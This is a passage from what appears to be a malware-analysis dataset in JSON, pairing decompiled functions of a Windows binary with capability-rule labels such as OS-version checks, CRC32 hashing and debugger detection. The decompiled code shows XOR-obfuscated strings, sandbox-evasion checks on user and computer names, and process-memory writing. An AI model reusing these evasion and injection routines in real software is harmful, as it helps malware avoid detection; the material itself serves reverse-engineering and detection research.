iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_8h = &var_28h - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_CreateMenu)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0xc2aaf0) {\n                var_8h = 5;\n                *(iVar3 + iVar6) = *(&var_14h + iVar3 % 5) ^ (iVar3 + iVar6)[&var_28h - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41db14 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41db14)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 896
    },
    "00401c11": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00401c11(uint param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint pSid;\n    uint pIdentifierAuthority;\n    uint var_ch;\n    int32_t nSize;\n    uint32_t cbSid;\n    \n    *0x41dab0 = param_1;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    *0x41dabc = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    *0x41dab4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n    fcn.00403435();\n    fcn.00401832();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x20);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    *0x41dad4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    if (*0x41dad4 != 0) {\n        nSize = 0x10;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetComputerNameW)(*0x41dad4, &nSize);\n        if (iVar4 == 0) {\n            var_24h = 0x4323563f;\n            var_20h = 0x56246f02;\n            var_1ch = 0x6f1e4322;\n            var_18h._0_2_ = 0x566a;\n            pIdentifierAuthority = 0x436d566a;\n            var_ch._0_2_ = 0x6f49;\n            uVar3 = (*pcVar2)(8, 0x1d);\n            iVar4 = (*pcVar1)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n                if (iVar5 != 0x5e7081) {\n                    cbSid = 6;\n                    *(iVar6 + iVar4) = *(&pIdentifierAuthority + iVar6 % 6) ^ (iVar6 + iVar4)[&var_24h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0xe);\n            (*_sym.imp.KERNEL32.dll_lstrcpyW)(*0x41dad4, iVar4);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n        fcn.00401dbb();\n    }\n    var_ch._0_2_ = 0x500;\n    pIdentifierAuthority = 0;\n    cbSid = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &nSize);\n    pcVar1 = _sym.imp.ADVAPI32.dll_CheckTokenMembership;\n    if (cbSid != 0) {\n        iVar4 = (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, nSize, &cbSid);\n        cbSid = cbSid & -(iVar4 != 0);\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(nSize);\n        if (cbSid != 0) {\n            if (*0x41dabc < 6) {\n                return 0;\n            }\n            fcn.00401ff3();\n            goto code_r0x00401da2;\n        }\n    }\n    nSize = 0;\n    cbSid = 0xc;\n    nSize = (*_sym.imp.ADVAPI32.dll_CreateWellKnownSid)(0x27, 0, &pSid, &cbSid);\n    if (nSize != 0) {\n        (*pcVar1)(0, &pSid, &nSize);\n    }\ncode_r0x00401da2:\n    if (5 < *0x41dabc) {\n        fcn.0040189b();\n    }\n    return 0;\n}\n",
        "token_count": 989
    },
    "00405a4b": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405a4b(uint param_1)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint lpBuffer;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    iVar5 = 0;\n    var_8h = param_1;\n    do {\n        *0x41db0c = 0;\n        var_ch = (*_sym.imp.KERNEL32.dll_CreateFileW)(var_8h, 0x80000000, 3, 0, 3, 0, 0);\n        if (var_ch != 0) {\n            while ((iVar3 = var_ch, \n                   iVar2 = (*_sym.imp.KERNEL32.dll_ReadFile)(var_ch, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0), \n                   iVar2 != 0 && (lpNumberOfBytesRead != 0))) {\n                puVar4 = &lpBuffer;\n                iVar3 = lpNumberOfBytesRead;\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                    *0x41db0c = *0x41db0c >> 8 ^ *((uVar1 ^ *0x41db0c & 0xff) * 4 + 0x4113c0) ^ 0xd202ef8d;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n            iVar3 = fcn.00401397(0x41db18);\n            if (iVar3 == 0) {\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        iVar5 = iVar5 + 1;\n        if (4 < iVar5) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 450
    },
    "00407ab4": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407ab4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t in_EDX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = 0;\n    arg_8h = arg_8h - in_EDX;\n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)(in_ECX, in_EDX, arg_8h + in_EDX, 1, 0);\n        if (iVar1 == 0) {\n            return 0;\n        }\n        iVar2 = iVar2 + 1;\n        in_EDX = in_EDX + 1;\n    } while (iVar2 < 5);\n    return 1;\n}\n",
        "token_count": 175
    },
    "00410115": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00410115(uchar *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int16_t *piVar7;\n    uchar *puVar8;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_29h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uchar *var_4h;\n    \n    if (param_1 != NULL) {\n        puVar8 = param_1;\n        for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_4h = param_1;\n        cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (cVar2 == '\\x05') {\n            stack0xffffffd4 = 0x303e5700;\n            var_24h = 0x57276331;\n            var_20h = 0x63363026;\n            var_1ch = 0x30345721;\n            var_18h._0_2_ = 0x6357;\n            var_14h = 0x30515753;\n            var_10h._0_2_ = 0x6357;\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n                if (iVar5 != 0x7d644) {\n                    var_8h = 6;\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % 6) ^ (iVar6 + piVar4)[&var_29h + (1 - piVar4)];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x12);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        else {\n            var_50h = 0x565f3620;\n            var_4ch = 0x3042730c;\n            var_48h = 0x36126a21;\n            var_44h = 0x730f5642;\n            var_40h = 0x6a17306a;\n            var_3ch = 0x56403603;\n            var_38h = 0x3057732e;\n            var_34h = 0x36126a22;\n            var_30h._0_2_ = 0x567c;\n            var_ch = 5;\n            var_30h._2_1_ = 5;\n            stack0xffffffcf = 0x56304173;\n            var_29h._0_1_ = 0x6a;\n            var_14h = 0x56303673;\n            var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x6a);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            piVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar6 = 0;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetCursor)();\n                if (iVar5 != 0xbe5448) {\n                    *(iVar6 + piVar4) = *(&var_14h + iVar6 % var_ch) ^ (iVar6 + piVar4)[&var_50h - piVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x28);\n            piVar7 = piVar4;\n            do {\n                iVar1 = *piVar7;\n                *((var_4h - piVar4) + piVar7) = iVar1;\n                piVar7 = piVar7 + 1;\n            } while (iVar1 != 0);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return;\n}\n",
        "token_count": 1139
    },
    "00401ff3": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.00401ff3(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x41dabc == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 176
    },
    "0040e75a": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040e75a(uint arg_8h, uint arg_ch, uint32_t *arg_10h, uint32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint *in_EDX;\n    uint var_4h;\n    \n    do {\n        iVar1 = fcn.0040df87(arg_8h, arg_ch, arg_10h, arg_14h, *in_EDX, arg_18h);\n        if (iVar1 != 6) break;\n    } while (*arg_14h <= *arg_10h && *arg_10h != *arg_14h);\n    if (iVar1 != 0) {\n        fcn.00409a4e();\n    }\n    return iVar1;\n}\n",
        "token_count": 195
    },
    "0040918d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040918d(char *param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar3 = 0xffffffff;\n    if (param_2 != 0) {\n        do {\n            uVar4 = *param_1;\n            param_2 = param_2 + -1;\n            param_1 = param_1 + 1;\n            iVar2 = 8;\n            do {\n                uVar1 = uVar4 ^ uVar3;\n                uVar3 = uVar3 >> 1;\n                if ((uVar1 & 1) != 0) {\n                    uVar3 = uVar3 ^ 0xedb88320;\n                }\n                uVar4 = uVar4 >> 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        } while (param_2 != 0);\n    }\n    return uVar3;\n}\n",
        "token_count": 236
    },
    "0040fdaa": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040fdaa(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h & 0x20006) == 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001);\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExW)(0x80000001);\n    }\n    uVar2 = 0;\n    if (iVar1 == 0) {\n        uVar2 = arg_8h;\n    }\n    return uVar2;\n}\n",
        "token_count": 152
    },
    "00403fd6": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00403fd6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint pcbBuffer;\n    int32_t var_ach;\n    int32_t var_a8h;\n    int32_t var_a4h;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    uint var_90h;\n    int32_t var_8ch;\n    uint var_88h;\n    int32_t var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    uint var_74h;\n    int32_t var_70h;\n    uint var_6ch;\n    int32_t var_68h;\n    uint var_64h;\n    int32_t var_60h;\n    uint var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_1bh;\n    uint var_17h;\n    uchar var_13h;\n    uchar var_12h;\n    uchar var_11h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = fcn.00404e22();\n    if (iVar4 != 0) {\n        fcn.00404fc8();\n    }\n    var_ch = 0x121d5013;\n    var_8h = 0x54421b01;\n    var_4h = 0x321b081e;\n    var_80h = 0x7a7a3277;\n    var_7ch._0_1_ = 100;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_54h = 5;\n    iVar14 = 0;\n    var_44h = &var_ch - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar6 != 0x9ae1e9) {\n            *(iVar14 + iVar4) = *(&var_80h + iVar14 % var_54h) ^ (iVar14 + iVar4)[&var_ch - iVar4];\n        }\n        iVar14 = iVar14 + 1;\n    } while (iVar14 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 != 0) {\n        fcn.00404fc8();\n    }\n    var_ch = 0x531f2e0b;\n    var_8h = 0x58201420;\n    var_4h = 0x4c142852;\n    var_78h = 0x36764c78;\n    var_74h._0_1_ = 0x44;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_80h = iVar14;\n    var_44h = &var_ch - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetShellWindow)();\n        if (iVar7 != 0x8cf110) {\n            *(iVar6 + iVar14) = *(&var_78h + iVar6 % var_54h) ^ (iVar6 + iVar14)[&var_ch - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 != 0) {\n        fcn.00404fc8();\n    }\n    pcbBuffer = 0x400;\n    iVar14 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x41ddd8, &pcbBuffer);\n    if (iVar14 == 0) {\n        fcn.00404fc8();\n    }\n    var_ch = 0xa3b3e7b;\n    var_8h = 0x1c3f5611;\n    var_4h = 0x4b4a110b;\n    var_70h = 0x78494b38;\n    var_6ch._0_1_ = 0x74;\n    uVar5 = (*pcVar2)(8, 0xd);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_78h = iVar14;\n    var_44h = &var_ch - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar7 != 0x371d50) {\n            *(iVar6 + iVar14) = *(&var_70h + iVar6 % var_54h) ^ (iVar6 + iVar14)[&var_ch - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xc);\n    iVar14 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd8, iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 == 0) {\n        fcn.00404fc8();\n    }\n    var_90h = 0x32095004;\n    var_8ch = 0x312f1b05;\n    var_8h = 0x56673157;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7467);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_58h = 6;\n    iVar6 = 0;\n    var_70h = iVar14;\n    var_44h = &var_90h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar7 != 0x7537ce) {\n            *(iVar6 + iVar14) = *(&var_8h + iVar6 % var_58h) ^ (iVar6 + iVar14)[&var_90h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar14 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd8, iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 == 0) {\n        fcn.00404fc8();\n    }\n    pcbBuffer = 0x400;\n    var_28h = 0x7141421b;\n    var_24h._0_1_ = 0x5b;\n    var_24h._1_1_ = 99;\n    var_24h._2_2_ = 0x3037;\n    var_20h._0_1_ = 6;\n    var_20h._1_1_ = 0x35;\n    var_20h._2_2_ = 0x420a;\n    var_1ch = 0x5e;\n    var_1bh._0_1_ = 0x71;\n    var_1bh._1_1_ = 0x5a;\n    var_1bh._2_1_ = 99;\n    var_1bh._3_1_ = 0x42;\n    var_17h._0_1_ = 0x30;\n    var_68h = 0x71304263;\n    var_64h._0_1_ = 0x35;\n    uVar5 = (*pcVar2)(8, 0x25);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_8ch = iVar14;\n    var_44h = &var_28h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar7 != 0x5556e3) {\n            *(iVar6 + iVar14) = *(&var_68h + iVar6 % var_54h) ^ (iVar6 + iVar14)[&var_28h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x12);\n    iVar14 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x41ddd8, &pcbBuffer);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar14 == 0) {\n        fcn.00404fc8();\n    }\n    var_28h = 0x7a7f705b;\n    var_24h._0_1_ = 10;\n    var_24h._1_1_ = 0x54;\n    var_24h._2_2_ = 0x705b;\n    var_20h._0_1_ = 0x76;\n    var_20h._1_1_ = 0x7a;\n    var_20h._2_2_ = 0x5459;\n    var_1ch = 0x5c;\n    var_1bh._0_1_ = 0x70;\n    var_1bh._1_1_ = 0x29;\n    var_1bh._2_1_ = 0x7a;\n    var_1bh._3_1_ = 0x79;\n    var_17h._0_1_ = 0x54;\n    var_8h = 0x7a5a7079;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5479);\n    uVar5 = (*pcVar2)(8, 0x25);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_68h = iVar14;\n    var_44h = &var_28h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar7 != 0x241b38) {\n            *(iVar6 + iVar14) = *(&var_8h + iVar6 % var_58h) ^ (iVar6 + iVar14)[&var_28h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x12);\n    var_88h = 0xb360261;\n    var_84h = 0x436a3b17;\n    var_8h = 0x4f784332;\n    var_4h = CONCAT22(var_4h._2_2_, 0x7455);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n    iVar14 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar6 = 0;\n    var_44h = &var_88h - iVar14;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n        if (iVar7 != 0xf85e23) {\n            *(iVar6 + iVar14) = *(&var_8h + iVar6 % var_58h) ^ (iVar6 + iVar14)[&var_88h - iVar14];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd8, iVar14);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.00404fc8();\n    }\n    var_17h._3_1_ = 0x50;\n    var_13h = 0x12;\n    var_12h = 0xf;\n    var_11h = 0x20;\n    var_10h = 0x41262b67;\n    var_8h = 0x6c464167;\n    var_4h = CONCAT22(var_4h._2_2_, 0x6231);\n    uVar5 = (*pcVar2)(8, 9);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    iVar7 = &var_17h + (3 - iVar6);\n    var_84h = iVar6;\n    var_44h = iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar8 != 0xbc52f2) {\n            *(iVar15 + iVar6) = *(&var_8h + iVar15 % var_58h) ^ (iVar15 + iVar6)[iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 8);\n    iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x41ddd8, iVar6);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        fcn.00404fc8();\n    }\n    var_24h._1_1_ = 5;\n    var_34h = 0x301e111a;\n    var_30h = 0x9021325;\n    var_2ch = 0x3173628;\n    var_28h = 0x23b260f;\n    var_24h._0_1_ = 4;\n    var_24h._2_2_ = 0x3c3b;\n    var_20h._0_1_ = 0xe;\n    var_20h._1_1_ = 3;\n    var_20h._2_2_ = 0x735;\n    var_1ch = 6;\n    var_1bh._0_1_ = 0x37;\n    var_1bh._1_1_ = 0x3d;\n    var_1bh._2_1_ = 0x4c;\n    var_17h._3_1_ = 0x52;\n    var_13h = 0x50;\n    var_12h = 0x4c;\n    var_11h = 0x74;\n    var_10h = CONCAT31(var_10h._1_3_, 0x72);\n    uVar5 = (*pcVar2)(8, 0x1d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar7 = 0;\n    var_44h = &var_34h - iVar6;\n    do {\n        iVar15 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n        if (iVar15 != 0x328c8e) {\n            *(iVar7 + iVar6) = *(&var_17h + iVar7 % var_54h + 3) ^ (iVar7 + iVar6)[&var_34h - iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1c);\n    var_28h = 0x3d103721;\n    var_24h._0_1_ = 0x20;\n    var_24h._1_1_ = 0x1f;\n    var_24h._2_2_ = 0xa0c;\n    var_20h._0_1_ = 0x26;\n    var_20h._1_1_ = 0x36;\n    var_20h._2_2_ = 0x2b24;\n    var_1ch = 0x11;\n    var_1bh._0_1_ = 0x3a;\n    var_1bh._1_1_ = 0x2c;\n    var_1bh._2_1_ = 0x1d;\n    var_1bh._3_1_ = 0x20;\n    var_17h._0_1_ = 99;\n    var_17h._3_1_ = 0x72;\n    var_13h = 0x4e;\n    var_12h = 99;\n    var_11h = 0x49;\n    var_10h = CONCAT31(var_10h._1_3_, 0x45);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_ach = &var_28h - iVar7;\n    var_44h = iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        puVar12 = extraout_ECX;\n        if (iVar8 != 0x894441) {\n            puVar12 = iVar15 + iVar7;\n            *puVar12 = *(&var_17h + iVar15 % var_54h + 3) ^ puVar12[&var_28h - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 0x12);\n    cVar3 = fcn.00403e76(puVar12, puVar12);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (cVar3 == '\\0') {\n        fcn.00404fc8();\n    }\n    var_17h._3_1_ = 0x11;\n    var_13h = 7;\n    var_12h = 0x7d;\n    var_11h = 0x61;\n    var_10h = CONCAT31(var_10h._1_3_, 0x7a);\n    var_8h = 0x41344a50;\n    var_4h = CONCAT22(var_4h._2_2_, 0x697a);\n    uVar5 = (*pcVar2)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    iVar15 = &var_17h + (3 - iVar7);\n    var_ach = iVar7;\n    var_a8h = iVar15;\n    do {\n        iVar9 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar9 != 0xd54b0b) {\n            *(iVar8 + iVar7) = *(&var_8h + iVar8 % var_58h) ^ (iVar8 + iVar7)[iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_8h = 0x380b3a18;\n    var_4h = CONCAT22(var_4h._2_2_, 0x5a14);\n    var_17h._3_1_ = 0x5a;\n    var_13h = 0x75;\n    var_12h = 0x48;\n    var_11h = 0x70;\n    var_10h = CONCAT31(var_10h._1_3_, 0x47);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 7);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar15 = 0;\n    var_a8h = iVar7;\n    var_a4h = &var_8h - iVar7;\n    do {\n        iVar8 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n        if (iVar8 != 0x502ebb) {\n            *(iVar15 + iVar7) = *(&var_17h + iVar15 % var_54h + 3) ^ (iVar15 + iVar7)[&var_8h - iVar7];\n        }\n        iVar15 = iVar15 + 1;\n    } while (iVar15 < 6);\n    var_17h._3_1_ = 0x18;\n    var_13h = 6;\n    var_12h = 0x79;\n    var_11h = 0x2e;\n    var_10h = CONCAT31(var_10h._1_3_, 0x70);\n    var_50h = 0x7636444e;\n    var_4ch._0_1_ = 0x70;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 6);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    iVar8 = 0;\n    iVar15 = &var_17h + (3 - iVar7);\n    var_a4h = iVar7;\n    var_a0h = iVar15;\n    do {\n        iVar9 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar9 != 0x7b5961) {\n            *(iVar8 + iVar7) = *(&var_50h + iVar8 % var_54h) ^ (iVar8 + iVar7)[iVar15];\n        }\n        iVar8 = iVar8 + 1;\n    } while (iVar8 < 5);\n    var_17h._3_1_ = 0x67;\n    var_13h = 0x1c;\n    var_12h = 0x34;\n    